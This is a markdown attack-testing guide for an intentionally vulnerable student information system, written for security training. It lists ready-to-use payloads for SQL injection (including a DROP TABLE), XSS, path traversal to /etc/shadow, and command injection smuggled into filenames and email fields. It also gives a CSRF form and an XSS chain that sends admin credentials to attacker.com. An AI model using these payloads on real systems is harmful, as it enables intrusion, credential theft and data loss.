# Attack Techniques & Testing Guide
## Tripati Group of Institutions - Vulnerable Student Information System

This document outlines various attack techniques that can be tested on this intentionally vulnerable application.

---

## 🔴 1. SQL INJECTION (SQLi)

### 1.1 Login Bypass
**Endpoint:** `POST /api/login`

**Attack:** Bypass authentication without valid credentials

**Payloads:**
```json
{
  "username": "admin' OR '1'='1'--",
  "password": "anything"
}
```

```json
{
  "username": "' OR '1'='1'--",
  "password": "' OR '1'='1'--"
}
```

```json
{
  "username": "admin'--",
  "password": "anything"
}
```

**Expected Result:** Login successful without valid credentials

---

### 1.2 Union-Based SQL Injection
**Endpoint:** `GET /api/student/marks/:id`

**Attack:** Extract data from other tables

**Payloads:**
```
GET /api/student/marks/STU001' UNION SELECT username,password,role FROM users--
```

```
GET /api/student/marks/STU001' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--
```

**Expected Result:** Returns data from users table (usernames and passwords)

---

### 1.3 Feedback Form SQL Injection
**Endpoint:** `POST /api/feedback`

**Attack:** Inject SQL in feedback comment field

**Payloads:**
```json
{
  "student_id": "STU001",
  "category": "general",
  "comment": "' OR '1'='1"
}
```

```json
{
  "student_id": "STU001",
  "category": "general",
  "comment": "'; DROP TABLE comments;--"
}
```

```json
{
  "student_id": "STU001",
  "category": "general",
  "comment": "' UNION SELECT username,password FROM users--"
}
```

**Expected Result:** SQL executed, potentially extracting or modifying data

---

### 1.4 Library Search SQL Injection
**Endpoint:** `GET /api/library/search?q=`

**Attack:** Inject SQL in search query

**Payloads:**
```
GET /api/library/search?q=' OR '1'='1'--
```

```
GET /api/library/search?q=' UNION SELECT * FROM users--
```

**Expected Result:** Returns all data or executes SQL

---

### 1.5 Student Search SQL Injection
**Endpoint:** `POST /api/student/search`

**Payload:**
```json
{
  "query": "' OR '1'='1'--"
}
```

**Expected Result:** Returns all students regardless of search term

---

## 🔴 2. IDOR (Insecure Direct Object Reference)

### 2.1 Access Other Students' Data
**Endpoint:** `GET /api/student/attendance/:id`

**Attack:** Access attendance of other students

**Examples:**
```
GET /api/student/attendance/STU002  (while logged in as STU001)
GET /api/student/attendance/STU003
GET /api/student/attendance/STU010
```

**Expected Result:** Can view any student's attendance without authorization

---

### 2.2 Access Other Students' Marks
**Endpoint:** `GET /api/student/marks/:id`

**Examples:**
```
GET /api/student/marks/STU002
GET /api/student/marks/STU005
```

**Expected Result:** Can view any student's marks

---

### 2.3 Access Other Students' Fees
**Endpoint:** `GET /api/student/fees/:id`

**Examples:**
```
GET /api/student/fees/STU002
GET /api/student/fees/STU003
```

**Expected Result:** Can view any student's fee payment details

---

### 2.4 Modify Other Students' Profiles
**Endpoint:** `PUT /api/student/profile/:id`

**Attack:** Update any student's profile

**Payload:**
```json
PUT /api/student/profile/STU002
{
  "name": "Hacked Name",
  "phone": "9999999999",
  "email": "hacked@evil.com",
  "city": "Hacked City",
  "cgpa": 10.0
}
```

**Expected Result:** Can modify any student's profile data

---

### 2.5 Library Books IDOR
**Endpoint:** `GET /api/library/books?student_id=`

**Examples:**
```
GET /api/library/books?student_id=STU002
GET /api/library/books?student_id=STU003
```

**Expected Result:** Can view any student's library books

---

## 🔴 3. CROSS-SITE SCRIPTING (XSS)

### 3.1 Stored XSS in Bio Field
**Location:** Profile Page → "About Me" textarea

**Payloads:**
```html
<script>alert('XSS')</script>
```

```html
<img src=x onerror=alert('XSS')>
```

```html
<svg onload=alert('XSS')>
```

```html
<script>
  fetch('/api/admin/users').then(r=>r.json()).then(d=>alert(JSON.stringify(d)));
</script>
```

**Expected Result:** Script executes when profile page is viewed

---

### 3.2 Stored XSS in Feedback
**Endpoint:** `POST /api/feedback`

**Payload:**
```json
{
  "student_id": "STU001",
  "category": "general",
  "comment": "<script>alert(document.cookie)</script>"
}
```

**Expected Result:** Script stored and executed when feedback is viewed

---

### 3.3 Reflected XSS in Search
**Endpoint:** `GET /api/search?query=`

**Payloads:**
```
GET /api/search?query=<script>alert('XSS')</script>
```

```
GET /api/search?query=<img src=x onerror=alert('XSS')>
```

**Expected Result:** Script reflected in search results

---

## 🔴 4. FILE UPLOAD VULNERABILITIES

### 4.1 Unrestricted File Upload
**Endpoint:** `POST /api/student/upload-photo`

**Attack:** Upload malicious files (PHP, JS, etc.)

**Tools:**
- Use Burp Suite or Postman
- Upload files with extensions: `.php`, `.jsp`, `.exe`, `.sh`

**Expected Result:** Files uploaded without validation

---

### 4.2 Path Traversal in File Access
**Endpoint:** `GET /api/file?path=`

**Payloads:**
```
GET /api/file?path=../../../etc/passwd
GET /api/file?path=../../../../etc/shadow
GET /api/file?path=../server.js
```

**Expected Result:** Access files outside intended directory

---

## 🔴 5. COMMAND INJECTION

### 5.1 CSV Upload Command Injection
**Endpoint:** `POST /api/admin/marks/upload`

**Attack:** Inject commands in filename or file content

**Payload:** Upload CSV with filename:
```
marks.csv; cat /etc/passwd
```

Or filename:
```
marks.csv | whoami
```

**Expected Result:** Commands executed on server

---

### 5.2 Email Injection
**Endpoint:** `POST /api/admin/notify`

**Payload:**
```json
{
  "to": "victim@example.com; cat /etc/passwd",
  "subject": "Test",
  "body": "Test"
}
```

**Expected Result:** Command executed via email injection

---

## 🔴 6. INFORMATION DISCLOSURE

### 6.1 Exposed User Credentials
**Endpoint:** `GET /api/admin/users`

**Attack:** Access all usernames and plaintext passwords

**Expected Result:** Returns all users with passwords in plaintext

---

### 6.2 Exposed System Logs
**Endpoint:** `GET /api/admin/logs`

**Attack:** View sensitive system logs

**Expected Result:** Returns logs with request data, IPs, timestamps

---

### 6.3 Public Student List
**Endpoint:** `GET /api/students`

**Attack:** Enumerate all students without authentication

**Expected Result:** Returns list of all students

---

### 6.4 Admin Reports
**Endpoint:** `GET /api/admin/reports/all`

**Attack:** Access admin reports without authentication

**Expected Result:** Returns department distribution and statistics

---

## 🔴 7. AUTHENTICATION BYPASS

### 7.1 Predictable Tokens
**Issue:** Tokens are base64 encoded `username::timestamp`

**Attack:** Decode token and predict other tokens

**Example:**
```javascript
// Token format: Buffer.from(username + '::' + Date.now()).toString('base64')
// Decode: atob(token) = "STU001::1234567890"
```

---

### 7.2 Plaintext Passwords
**Issue:** All passwords stored in plaintext

**Attack:** Once you get access to database, all passwords are visible

---

## 🔴 8. AUTHORIZATION ISSUES

### 8.1 No CSRF Protection
**Issue:** No CSRF tokens on state-changing operations

**Attack:** Create malicious page that performs actions on behalf of user

**Example HTML:**
```html
<form action="http://localhost:3000/api/student/profile/STU001" method="POST">
  <input name="name" value="Hacked">
  <input name="cgpa" value="10.0">
</form>
<script>document.forms[0].submit();</script>
```

---

### 8.2 Missing Authorization Checks
**Issue:** No ownership verification on student endpoints

**Attack:** Access/modify any student's data while logged in as different student

---

## 🔴 9. CLIENT-SIDE VULNERABILITIES

### 9.1 Client-Side Fine Calculation
**Location:** Library page - Fine calculation

**Attack:** Modify JavaScript to change fine amounts

**Method:** Use browser DevTools to modify calculation logic

---

### 9.2 Payment Form Data Exposure
**Location:** Fee Payment page

**Issue:** Card details sent without encryption

**Attack:** Intercept network traffic to capture card details

---

## 🔴 10. TESTING TOOLS & METHODS

### Recommended Tools:
1. **Burp Suite** - Intercept and modify requests
2. **Postman** - API testing
3. **Browser DevTools** - Client-side testing
4. **SQLMap** - Automated SQL injection
5. **OWASP ZAP** - Security scanning

### Testing Workflow:

1. **Reconnaissance:**
   - Map all endpoints
   - Identify input fields
   - Check for authentication requirements

2. **Authentication Testing:**
   - Try SQL injection in login
   - Test predictable tokens
   - Check for session management issues

3. **Authorization Testing:**
   - Test IDOR on all endpoints
   - Try accessing admin endpoints as student
   - Test horizontal privilege escalation

4. **Input Validation:**
   - Test SQL injection on all inputs
   - Test XSS on all text fields
   - Test command injection on file uploads

5. **Information Disclosure:**
   - Check for exposed sensitive data
   - Test error messages for information leakage
   - Check for debug information

---

## 🔴 11. PRACTICAL ATTACK SCENARIOS

### Scenario 1: Complete Account Takeover
1. Use SQL injection in login: `admin' OR '1'='1'--`
2. Access `/api/admin/users` to get all passwords
3. Login as any student
4. Modify their profile via IDOR

### Scenario 2: Data Exfiltration
1. Login as STU001
2. Use SQL injection in marks endpoint: `STU001' UNION SELECT username,password FROM users--`
3. Extract all user credentials
4. Access all student data via IDOR

### Scenario 3: XSS Attack Chain
1. Inject XSS in profile bio: `<script>fetch('/api/admin/users').then(r=>r.json()).then(d=>fetch('http://attacker.com/steal?data='+btoa(JSON.stringify(d))))</script>`
2. When admin views profile, credentials are exfiltrated
3. Use credentials to access admin panel

### Scenario 4: Command Injection
1. Upload CSV with malicious filename: `marks.csv; cat /etc/passwd > /tmp/stolen.txt`
2. Command executes on server
3. Access stolen file via path traversal

---

## ⚠️ IMPORTANT NOTES

- **This is an intentionally vulnerable application for educational purposes**
- **Only test on your own local environment**
- **Do not use these techniques on production systems**
- **Always obtain proper authorization before testing**
- **Document all findings for security improvement**

---

## 📝 TESTING CHECKLIST

- [ ] SQL Injection in login form
- [ ] SQL Injection in all search fields
- [ ] SQL Injection in feedback form
- [ ] IDOR on attendance endpoint
- [ ] IDOR on marks endpoint
- [ ] IDOR on fees endpoint
- [ ] IDOR on profile update
- [ ] Stored XSS in bio field
- [ ] Stored XSS in feedback
- [ ] Reflected XSS in search
- [ ] File upload bypass
- [ ] Path traversal
- [ ] Command injection in CSV upload
- [ ] Email injection
- [ ] Access admin endpoints without auth
- [ ] View exposed credentials
- [ ] View system logs
- [ ] CSRF on state-changing operations
- [ ] Client-side manipulation

---

**Happy Ethical Hacking! 🎯**

